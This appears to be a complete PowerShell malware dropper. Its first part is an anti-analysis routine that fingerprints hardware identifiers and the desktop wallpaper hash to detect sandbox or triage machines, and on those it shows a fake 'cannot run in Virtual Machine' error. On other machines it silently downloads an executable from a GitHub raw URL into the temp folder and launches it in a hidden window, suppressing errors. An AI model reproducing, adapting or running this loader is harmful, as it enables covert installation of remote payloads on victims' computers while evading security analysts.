function Test-AntiTriage {
    $vmDetected = $false

    # Check Disk Drive
    try {
        $disk = Get-CimInstance -ClassName Win32_DiskDrive | Select-Object Model, SerialNumber
        if ($disk.Model -match "WDC WDS100T2B0A" -or $disk.SerialNumber -match "232138804165") {
            $vmDetected = $true
        }
    } catch {}

    # Check Keyboard
    try {
        $kbd = Get-CimInstance -ClassName Win32_Keyboard | Select-Object Description, DeviceID
        if ($kbd.DeviceID -match "ACPI\\PNP0303" -or $kbd.Description -match "Standard PS/2 Keyboard") {
            $vmDetected = $true
        }
    } catch {}

    # Check Mouse / Pointing Device
    try {
        $mouse = Get-CimInstance -ClassName Win32_PointingDevice | Select-Object Description, PNPDeviceID
        if ($mouse.PNPDeviceID -match "ACPI\\PNP0F13|USB\\VID_0627&PID_0001" -or $mouse.Description -match "PS/2 Compatible Mouse|USB Input Device") {
            $vmDetected = $true
        }
    } catch {}

    # Check Monitor
    try {
        $monitor = Get-CimInstance -ClassName Win32_DesktopMonitor | Select-Object Description, PNPDeviceID
        if ($monitor.PNPDeviceID -match "DISPLAY\\RHT1234" -or $monitor.Description -match "Generic PnP Monitor") {
            $vmDetected = $true
        }
    } catch {}

    # Check CPU
    try {
        $cpu = Get-CimInstance -ClassName Win32_Processor | Select-Object Name
        if ($cpu.Name -match "Intel Core Processor \(Broadwell\)") {
            $vmDetected = $true
        }
    } catch {}

    # Check Wallpaper Hash Triage V2
    try {
        $wallpaperPath = (Get-ItemProperty 'HKCU:\Control Panel\Desktop').Wallpaper
        if ($wallpaperPath -and (Test-Path $wallpaperPath)) {
            $imageBytes = [System.IO.File]::ReadAllBytes($wallpaperPath)
            $base64String = [Convert]::ToBase64String($imageBytes)
            if ($base64String.Length -gt 64) {
                $truncatedBase64 = $base64String.Substring(0, 64)
                if ($truncatedBase64 -eq "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAwMDAwMDA0ODg0SExETEhsYFhYYGygd") {
                    $vmDetected = $true
                }
            }
        }
    } catch {}

    return $vmDetected
}

# Run Anti-Triage check
if (Test-AntiTriage) {
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("I'm sorry But this application cannot run in Virtual Machine.", "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
    exit
}

$url = "https://github.com/nqox3/pig/raw/refs/heads/main/zalypa1.exe"
$output = "$env:TEMP\zalypa1.exe"

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($url, $output)
    
    if (Test-Path $output) {
        Start-Process $output -WindowStyle Hidden
    }
} catch {
    # Silent catch
}
